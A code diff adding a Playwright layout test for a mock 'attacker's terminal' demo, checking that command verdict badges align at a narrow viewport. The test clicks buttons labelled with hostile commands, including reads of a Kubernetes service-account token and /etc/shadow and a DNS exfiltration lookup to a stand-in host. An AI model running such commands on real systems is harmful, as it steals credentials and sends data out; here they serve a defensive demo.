@@ -830,6 +830,47 @@ test.describe("attacker's terminal (mock, ADR 0033)", () => {
     expect(problems).toEqual([]);
   });
 
+  test("the session summary's layer map: each command's verdict badge in one column, 'ended the session' under it, nothing past the edge at 360 px", async ({ page }) => {
+    await page.setViewportSize({ width: 360, height: 780 });
+    await page.goto("/?mock=1&mock-speed=0.3");
+    const term = page.locator("#terminal");
+    await term.getByRole("button", { name: /Open the terminal/ }).click();
+    await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
+    for (const name of ["id", /^echo pwned>/, "cat /var/run/secrets/kubernetes.io/serviceaccount/token", "nslookup sdp-<flag>.x.exfil.sdp.test.", "cat /etc/shadow"]) {
+      await term.getByRole("button", { name, exact: typeof name === "string" }).click();
+      if (name !== "cat /etc/shadow") await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
+    }
+    await expect(term.locator(".term__summary")).toBeVisible({ timeout: 15_000 });
+    const lists = term.locator(".term__summary .deflayer__entries");
+    expect(await lists.count()).toBeGreaterThanOrEqual(2);
+    for (const list of await lists.all()) {
+      const m = await list.evaluate((ul) => {
+        const badges = [...ul.querySelectorAll<HTMLElement>(".deflayer__verdict, .deflayer__ended")].map((b) => b.getBoundingClientRect());
+        const box = ul.getBoundingClientRect();
+        const verdicts = [...ul.querySelectorAll<HTMLElement>(".deflayer__verdict")].map((b) => b.getBoundingClientRect());
+        const rows = [...ul.children].map((li) => {
+          const c = li.querySelector("code")!.getBoundingClientRect();
+          const v = li.querySelector(".deflayer__verdict")!.getBoundingClientRect();
+          return { codeTop: c.top, codeRight: c.right, verdictTop: v.top, verdictLeft: v.left };
+        });
+        return { rights: badges.map((b) => Math.round(b.right)), lefts: badges.map((b) => Math.round(b.left)), widths: verdicts.map((b) => Math.round(b.width)), right: box.right, rows };
+      });
+      expect(m.lefts.length).toBeGreaterThanOrEqual(m.rows.length);
+      // One column: every badge shares one right edge, the verdicts one width.
+      expect(new Set(m.rights).size).toBe(1);
+      expect(new Set(m.widths).size).toBe(1);
+      expect(m.rights[0]).toBeLessThanOrEqual(Math.round(m.right) + 1);
+      for (const r of m.rows) {
+        // A command never runs under its badge, however long it is; the badge sits on its first line.
+        expect(r.codeRight).toBeLessThanOrEqual(r.verdictLeft + 1);
+        expect(Math.abs(r.verdictTop - r.codeTop)).toBeLessThan(6);
+      }
+    }
+    await expect(term.locator(".term__summary .deflayer__ended")).toHaveCount(1);
+    await nothingPastEdge(page, ".term__summary");
+    await noHorizontalScroll(page);
+  });
+
   test("the bar counts down the 5-minute session and the 90 s idle limit without moving, and says why it ended", async ({ page }) => {
     const problems = guardConsole(page);
     await page.goto("/?mock=1");
